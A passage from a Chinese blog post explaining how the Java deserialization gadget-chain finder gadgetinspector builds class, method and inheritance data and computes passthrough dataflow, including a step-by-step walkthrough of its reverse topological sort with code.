&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来看下classes.dat、methods.dat分别长什么样子：</p><p><strong>classes.dat</strong></p><p>找了两个比较有特征的</p><table><thead><tr><th>类名</th><th>父类名</th><th>所有接口</th><th>是否是接口</th><th>成员</th></tr></thead><tbody><tr><td>com/sun/deploy/jardiff/JarDiffPatcher</td><td>java/lang/Object</td><td>com/sun/deploy/jardiff/JarDiffConstants,com/sun/deploy/jardiff/Patcher</td><td>false</td><td>newBytes!2![B</td></tr><tr><td>com/sun/corba/se/impl/presentation/rmi/InvocationHandlerFactoryImpl$CustomCompositeInvocationHandlerImpl</td><td>com/sun/corba/se/spi/orbutil/proxy/CompositeInvocationHandlerImpl</td><td>com/sun/corba/se/spi/orbutil/proxy/LinkedInvocationHandler,java/io/Serializable</td><td>false</td><td>stub!130!com/sun/corba/se/spi/presentation/rmi/DynamicStub!this$0!4112!com/sun/corba/se/impl/presentation/rmi/InvocationHandlerFactoryImpl</td></tr></tbody></table><p>第一个类com/sun/deploy/jardiff/JarDiffPatcher：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/2.png" alt=""></p><p>和上面的表格信息对应一下，是吻合的</p><ul><li>类名：com/sun/deploy/jardiff/JarDiffPatcher</li><li>父类：  java/lang/Object，如果一类没有显式继承其他类，默认隐式继承java/lang/Object，并且java中不允许多继承，所以每个类只有一个父类</li><li>所有接口：com/sun/deploy/jardiff/JarDiffConstants、com/sun/deploy/jardiff/Patcher</li><li>是否是接口：false</li><li>成员：newBytes!2![B，newBytes成员，Byte类型。为什么没有将static/final类型的成员加进去呢？这里还没有研究如何操作字节码，所以作者这里的判断实现部分暂且跳过。不过猜测应该是这种类型的变量并不能成为<strong>污点</strong>所以忽略了</li></ul><p>第二个类com/sun/corba/se/impl/presentation/rmi/InvocationHandlerFactoryImpl$CustomCompositeInvocationHandlerImpl：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/3.png" alt=""></p><p>和上面的表格信息对应一下，也是吻合的</p><ul><li>类名：com/sun/corba/se/impl/presentation/rmi/InvocationHandlerFactoryImpl$CustomCompositeInvocationHandlerImpl，是一个内部类</li><li>父类：  com/sun/corba/se/spi/orbutil/proxy/CompositeInvocationHandlerImpl</li><li>所有接口：com/sun/corba/se/spi/orbutil/proxy/LinkedInvocationHandler,java/io/Serializable</li><li>是否是接口：false</li><li>成员：stub!130!com/sun/corba/se/spi/presentation/rmi/DynamicStub!this$0!4112!com/sun/corba/se/impl/presentation/rmi/InvocationHandlerFactoryImpl，!*!这里可以暂时理解为分割符，有一个成员stub，类型com/sun/corba/se/spi/presentation/rmi/DynamicStub。因为是内部类，所以多了个this成员，这个this指向的是外部类</li></ul><p><strong>methods.dat</strong></p><p>同样找几个比较有特征的</p><table><thead><tr><th>类名</th><th>方法名</th><th>方法描述信息</th><th>是否是静态方法</th></tr></thead><tbody><tr><td>sun/nio/cs/ext/Big5</td><td>newEncoder</td><td>()Ljava/nio/charset/CharsetEncoder;</td><td>false</td></tr><tr><td>sun/nio/cs/ext/Big5_HKSCS$Decoder</td><td><init></init></td><td>(Ljava/nio/charset/Charset;Lsun/nio/cs/ext/Big5_HKSCS$1;)V</td><td>false</td></tr></tbody></table><p>sun/nio/cs/ext/Big5#newEncoder：</p><ul><li>类名：sun/nio/cs/ext/Big5</li><li>方法名： newEncoder</li><li>方法描述信息：  ()Ljava/nio/charset/CharsetEncoder;   无参，返回java/nio/charset/CharsetEncoder对象</li><li>是否是静态方法：false</li></ul><p>sun/nio/cs/ext/Big5_HKSCS$Decoder#<init>：</init></p><ul><li>类名：sun/nio/cs/ext/Big5_HKSCS$Decoder</li><li>方法名：<init></init></li><li>方法描述信息： (Ljava/nio/charset/Charset;Lsun/nio/cs/ext/Big5_HKSCS$1;)V   参数1是java/nio/charset/Charset类型，参数2是sun/nio/cs/ext/Big5_HKSCS$1类型，返回值void</li><li>是否是静态方法：false</li></ul><p><strong>继承关系的生成</strong></p><p>继承关系在后面用来判断一个类是否能被某个库序列化、以及搜索子类方法实现等会用到。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InheritanceDeriver</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(InheritanceDeriver.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InheritanceMap <span class="title">derive</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap)</span> </span>&#123;</span><br><span class="line">        LOGGER.debug(<span class="string">"Calculating inheritance for "</span> + (classMap.size()) + <span class="string">" classes..."</span>);</span><br><span class="line">        Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; implicitInheritance = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (ClassReference classReference : classMap.values()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (implicitInheritance.containsKey(classReference.getHandle())) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Already derived implicit classes for "</span> + classReference.getName());</span><br><span class="line">            &#125;</span><br><span class="line">            Set&lt;ClassReference.Handle&gt; allParents = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"></span><br><span class="line">            getAllParents(classReference, classMap, allParents);<span class="comment">//获取当前类的所有父类</span></span><br><span class="line"></span><br><span class="line">            implicitInheritance.put(classReference.getHandle(), allParents);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> InheritanceMap(implicitInheritance);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getAllParents</span><span class="params">(ClassReference classReference, Map&lt;ClassReference.Handle, ClassReference&gt; classMap, Set&lt;ClassReference.Handle&gt; allParents)</span> </span>&#123;</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; parents = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (classReference.getSuperClass() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            parents.add(<span class="keyword">new</span> ClassReference.Handle(classReference.getSuperClass()));<span class="comment">//父类</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (String iface : classReference.getInterfaces()) &#123;</span><br><span class="line">            parents.add(<span class="keyword">new</span> ClassReference.Handle(iface));<span class="comment">//接口类</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle immediateParent : parents) &#123;</span><br><span class="line">            <span class="comment">//获取间接父类，以及递归获取间接父类的父类</span></span><br><span class="line">            ClassReference parentClassReference = classMap.get(immediateParent);</span><br><span class="line">            <span class="keyword">if</span> (parentClassReference == <span class="keyword">null</span>) &#123;</span><br><span class="line">                LOGGER.debug(<span class="string">"No class id for "</span> + immediateParent.getName());</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            allParents.add(parentClassReference.getHandle());</span><br><span class="line">            getAllParents(parentClassReference, classMap, allParents);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一步的结果保存到了inheritanceMap.dat：</p><table><thead><tr><th>类</th><th>直接父类+间接父类</th></tr></thead><tbody><tr><td>com/sun/javaws/OperaPreferences$PreferenceSection$PreferenceEntryIterator</td><td>java/lang/Object、java/util/Iterator</td></tr><tr><td>com/sun/java/swing/plaf/windows/WindowsLookAndFeel$XPValue</td><td>java/lang/Object、javax/swing/UIDefaults$ActiveValue</td></tr></tbody></table><h4 id="Step2-生成passthrough数据流"><a href="#Step2-生成passthrough数据流" class="headerlink" title="Step2 生成passthrough数据流"></a>Step2 生成passthrough数据流</h4><p>这里的passthrough数据流指的是每个方法的返回结果与方法参数的关系，这一步生成的数据会在生成passthrough调用图时用到。</p><p>以作者给出的demo为例，先从宏观层面判断下：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/4.png" alt=""></p><p>FnConstant.invoke返回值与参数this(参数0，因为序列化时类的所有成员我们都能控制，所以所有成员变量都视为0参)、arg(参数1)的关系：</p><ul><li>与this的关系：返回了this.value，即与0参有关系</li><li>与arg的关系：返回值与arg没有任何关系，即与1参没有关系</li><li>结论就是FnConstant.invoke与参数0有关，表示为FnConstant.invoke()-&gt;0</li></ul><p>Fndefault.invoke返回值与参数this(参数0)、arg(参数1)的关系：</p><ul><li>与this的关系：返回条件的第二个分支与this.f有关系，即与0参有关系</li><li>与arg的关系：返回条件的第一个分支与arg有关系，即与1参有关系</li><li>结论就是FnConstant.invoke与0参，1参都有关系，表示为Fndefault.invoke()-&gt;0、Fndefault.invoke()-&gt;1</li></ul><p>在这一步中，gadgetinspector是利用ASM来进行方法字节码的分析，主要逻辑是在类PassthroughDiscovery和TaintTrackingMethodVisitor中。特别是TaintTrackingMethodVisitor，它通过标记追踪JVM虚拟机在执行方法时的stack和localvar，并最终得到返回结果是否可以被参数标记污染。</p><p>核心实现代码（TaintTrackingMethodVisitor涉及到字节码分析，暂时先不看）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PassthroughDiscovery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(PassthroughDiscovery.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodCalls = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator, <span class="keyword">final</span> GIConfig config)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();<span class="comment">//load之前保存的methods.dat</span></span><br><span class="line">        Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();<span class="comment">//load之前保存的classes.dat</span></span><br><span class="line">        InheritanceMap inheritanceMap = InheritanceMap.load();<span class="comment">//load之前保存的inheritanceMap.dat</span></span><br><span class="line"></span><br><span class="line">        Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourceByName = discoverMethodCalls(classResourceEnumerator);<span class="comment">//查找一个方法中包含的子方法</span></span><br><span class="line">        List&lt;MethodReference.Handle&gt; sortedMethods = topologicallySortMethodCalls();<span class="comment">//对所有方法构成的图执行逆拓扑排序</span></span><br><span class="line">        passthroughDataflow = calculatePassthroughDataflow(classResourceByName, classMap, inheritanceMap, sortedMethods,</span><br><span class="line">                config.getSerializableDecider(methodMap, inheritanceMap));<span class="comment">//计算生成passthrough数据流，涉及到字节码分析</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">private</span> List&lt;MethodReference.Handle&gt; topologicallySortMethodCalls() &#123;</span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodCalls.entrySet()) &#123;</span><br><span class="line">            MethodReference.Handle method = entry.getKey();</span><br><span class="line">            outgoingReferences.put(method, <span class="keyword">new</span> HashSet&lt;&gt;(entry.getValue()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对所有方法构成的图执行逆拓扑排序</span></span><br><span class="line">        LOGGER.debug(<span class="string">"Performing topological sort..."</span>);</span><br><span class="line">        Set&lt;MethodReference.Handle&gt; dfsStack = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        Set&lt;MethodReference.Handle&gt; visitedNodes = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        List&lt;MethodReference.Handle&gt; sortedMethods = <span class="keyword">new</span> ArrayList&lt;&gt;(outgoingReferences.size());</span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle root : outgoingReferences.keySet()) &#123;</span><br><span class="line">            dfsTsort(outgoingReferences, sortedMethods, visitedNodes, dfsStack, root);</span><br><span class="line">        &#125;</span><br><span class="line">        LOGGER.debug(String.format(<span class="string">"Outgoing references %d, sortedMethods %d"</span>, outgoingReferences.size(), sortedMethods.size()));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sortedMethods;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dfsTsort</span><span class="params">(Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences,</span></span></span><br><span class="line"><span class="function"><span class="params">                                    List&lt;MethodReference.Handle&gt; sortedMethods, Set&lt;MethodReference.Handle&gt; visitedNodes,</span></span></span><br><span class="line"><span class="function"><span class="params">                                    Set&lt;MethodReference.Handle&gt; stack, MethodReference.Handle node)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (stack.contains(node)) &#123;<span class="comment">//防止在dfs一条方法调用链中进入循环</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (visitedNodes.contains(node)) &#123;<span class="comment">//防止对某个方法及子方法重复排序</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Set&lt;MethodReference.Handle&gt; outgoingRefs = outgoingReferences.get(node);</span><br><span class="line">        <span class="keyword">if</span> (outgoingRefs == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        stack.add(node);</span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle child : outgoingRefs) &#123;</span><br><span class="line">            dfsTsort(outgoingReferences, sortedMethods, visitedNodes, stack, child);</span><br><span class="line">        &#125;</span><br><span class="line">        stack.remove(node);</span><br><span class="line">        visitedNodes.add(node);</span><br><span class="line">        sortedMethods.add(node);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>拓扑排序</strong></p><p>有向无环图（DAG）才有拓扑排序，非 DAG 图没有拓扑排序。 当有向无环图满足以下条件时：</p><ul><li>每一个顶点出现且只出现一次</li><li>若A在序列中排在B的前面，则在图中不存在从B到A的路径</li></ul><p><img src="../images/Java反序列化工具gadgetinspector初窥/6.png" alt=""></p><p>这样的图，是一个拓扑排序的图。树结构其实可以转化为拓扑排序，而拓扑排序 不一定能够转化为树。</p><p>以上面的拓扑排序图为例，用一个字典表示图结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">graph = &#123;</span><br><span class="line">    &quot;a&quot;: [&quot;b&quot;,&quot;d&quot;],</span><br><span class="line">    &quot;b&quot;: [&quot;c&quot;],</span><br><span class="line">    &quot;d&quot;: [&quot;e&quot;,&quot;c&quot;],</span><br><span class="line">    &quot;e&quot;: [&quot;c&quot;],</span><br><span class="line">    &quot;c&quot;: [],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">graph = &#123;</span><br><span class="line">    <span class="string">"a"</span>: [<span class="string">"b"</span>,<span class="string">"d"</span>],</span><br><span class="line">    <span class="string">"b"</span>: [<span class="string">"c"</span>],</span><br><span class="line">    <span class="string">"d"</span>: [<span class="string">"e"</span>,<span class="string">"c"</span>],</span><br><span class="line">    <span class="string">"e"</span>: [<span class="string">"c"</span>],</span><br><span class="line">    <span class="string">"c"</span>: [],</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">TopologicalSort</span><span class="params">(graph)</span>:</span></span><br><span class="line">  degrees = dict((u, <span class="number">0</span>) <span class="keyword">for</span> u <span class="keyword">in</span> graph)</span><br><span class="line">  <span class="keyword">for</span> u <span class="keyword">in</span> graph:</span><br><span class="line">      <span class="keyword">for</span> v <span class="keyword">in</span> graph[u]:</span><br><span class="line">          degrees[v] += <span class="number">1</span></span><br><span class="line">  <span class="comment">#入度为0的插入队列</span></span><br><span class="line">  queue = [u <span class="keyword">for</span> u <span class="keyword">in</span> graph <span class="keyword">if</span> degrees[u] == <span class="number">0</span>]</span><br><span class="line">  res = []</span><br><span class="line">  <span class="keyword">while</span> queue:</span><br><span class="line">      u = queue.pop()</span><br><span class="line">      res.append(u)</span><br><span class="line">      <span class="keyword">for</span> v <span class="keyword">in</span> graph[u]:</span><br><span class="line">          <span class="comment"># 移除边，即将当前元素相关元素的入度-1</span></span><br><span class="line">          degrees[v] -= <span class="number">1</span></span><br><span class="line">          <span class="keyword">if</span> degrees[v] == <span class="number">0</span>:</span><br><span class="line">              queue.append(v)</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">print(TopologicalSort(graph)) <span class="comment"># ['a', 'd', 'e', 'b', 'c']</span></span><br></pre></td></tr></table></figure><p>但是在方法的调用中，我们希望最后的结果是c、b、e、d、a，这一步需要逆拓扑排序，正向排序使用的BFS，那么得到相反结果可以使用DFS。为什么在方法调用中需要使用逆拓扑排序呢，这与生成passthrough数据流有关。看下面一个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">parentMethod</span><span class="params">(String arg)</span></span>&#123;</span><br><span class="line">        String vul = Obj.childMethod(arg);</span><br><span class="line">        <span class="keyword">return</span> vul;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>那么这里arg与返回值到底有没有关系呢？假设Obj.childMethod为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">childMethod</span><span class="params">(String carg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> carg.toString();</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>由于childMethod的返回值carg与有关，那么可以判定parentMethod的返回值与参数arg是有关系的。所以如果存在子方法调用并传递了父方法参数给子方法时，需要先判断子方法返回值与子方法参数的关系。因此需要让子方法的判断在前面，这就是为什么要进行逆拓扑排序。</p><p>从下图可以看出outgoingReferences的数据结构为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    method1:(method2,method3,method4),</span><br><span class="line"></span><br><span class="line">    method5:(method1,method6),</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而这个结构正好适合逆拓扑排序</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/5.png" alt=""></p><p>但是上面说拓扑排序时不能形成环，但是在方法调用中肯定是会存在环的。作者是如何避免的呢？</p><p>在上面的dfsTsort实现代码中可以看到使用了stack和visitedNodes，stack保证了在进行逆拓扑排序时不会形成环，visitedNodes避免了重复排序。使用如下一个调用图来演示过程：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/7.png" alt=""></p><p>从图中可以看到有环med1-&gt;med2-&gt;med6-&gt;med1，并且有重复的调用med3，严格来说并不能进行逆拓扑排序，但是通过stack、visited记录访问过的方法，就能实现逆拓扑排序。为了方便解释把上面的图用一个树来表示：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/8.png" alt=""></p><p>对上图进行逆拓扑排序（DFS方式）：</p><p>从med1开始，先将med1加入stack中，此时stack、visited、sortedmethods状态如下：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/9.png" alt=""></p><p>med1还有子方法？有，继续深度遍历。将med2放入stack，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/10.png" alt=""></p><p>med2有子方法吗？有，继续深度遍历。将med3放入stack，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/11.png" alt=""></p><p>med3有子方法吗？有，继续深度遍历。将med7放入stack，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/12.png" alt=""></p><p>med7有子方法吗？没有，从stack中弹出med7并加入visited和sortedmethods，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/13.png" alt=""></p><p>回溯到上一层，med3还有其他子方法吗？有，med8，将med8放入stack，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/14.png" alt=""></p><p>med8还有子方法吗？没有，弹出stack，加入visited与sortedmethods，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/15.png" alt=""></p><p>回溯到上一层，med3还有其他子方法吗？没有了，弹出stack，加入visited与sortedmethods，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/16.png" alt=""></p><p>回溯到上一层，med2还有其他子方法吗？有，med6，将med6加入stack，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/17.png" alt=""></p><p>med6还有子方法吗？有，med1，med1在stack中？不加入，抛弃。此时状态和上一步一样</p><p>回溯到上一层，med6还有其他子方法吗？没有了，弹出stack，加入visited和sortedmethods，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/18.png" alt=""></p><p>回溯到上一层，med2还有其他子方法吗？没有了，弹出stack，加入visited和sortedmethods，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/19.png" alt=""></p><p>回溯到上一层，med1还有其他子方法吗？有，med3，med3在visited中？在，抛弃。</p><p>回溯到上一层，med1还有其他子方法吗？有，med4，将med4加入stack，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/20.png" alt=""></p><p>med4还有其他子方法吗？没有，弹出stack，加入visited和sortedmethods中，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/21.png" alt=""></p><p>回溯到上一层，med1还有其他子方法吗？没有了，弹出stack，加入visited和sortedmethods中，此时的状态（即最终状态）：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/22.png" alt=""></p><p>所以最后的逆拓扑排序结果为：med7、med8、med3、med6、med2、med4、med1。</p><p><strong>生成passthrough数据流</strong></p><p>在calculatePassthroughDataflow中遍历了sortedmethods，并通过字节码分析，生成了方法返回值与参数关系的passthrough数据流。注意到下面的序列化决定器，作者内置了三种：JDK、Jackson、Xstream，会根据具体的序列化决定器判定决策过程中的类是否符合对应库的反序列化要求，不符合的就跳过：</p><ul><li>对于JDK(ObjectInputStream)，类否继承了Serializable接口</li><li>对于Jackson，类是否存在0参构造器</li><li>对于Xstream，类名能否作为有效的XML标签</li></ul><p>生成passthrough数据流代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; calculatePassthroughDataflow(Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourceByName,</span><br><span class="line">                                                                                          Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span><br><span class="line">                                                                                          InheritanceMap inheritanceMap,</span><br><span class="line">                                                                                          List&lt;MethodReference.Handle&gt; sortedMethods,</span><br><span class="line">                                                                                          SerializableDecider serializableDecider) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : sortedMethods) &#123;<span class="comment">//依次遍历sortedmethods，并且每个方法的子方法判定总在这个方法之前，这是通过的上面的逆拓扑排序实现的。</span></span><br><span class="line">            <span class="keyword">if</span> (method.getName().equals(<span class="string">"&lt;clinit&gt;"</span>)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ClassResourceEnumerator.ClassResource classResource = classResourceByName.get(method.getClassReference().getName());</span><br><span class="line">            <span class="keyword">try</span> (InputStream inputStream = classResource.getInputStream()) &#123;</span><br><span class="line">                ClassReader cr = <span class="keyword">new</span> ClassReader(inputStream);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    PassthroughDataflowClassVisitor cv = <span class="keyword">new</span> PassthroughDataflowClassVisitor(classMap, inheritanceMap,</span><br><span class="line">                            passthroughDataflow, serializableDecider, Opcodes.ASM6, method);</span><br><span class="line">                    cr.accept(cv, ClassReader.EXPAND_FRAMES);<span class="comment">//通过结合classMap、inheritanceMap、已判定出的passthroughDataflow结果、序列化决定器信息来判定当前method的返回值与参数的关系</span></span><br><span class="line">                   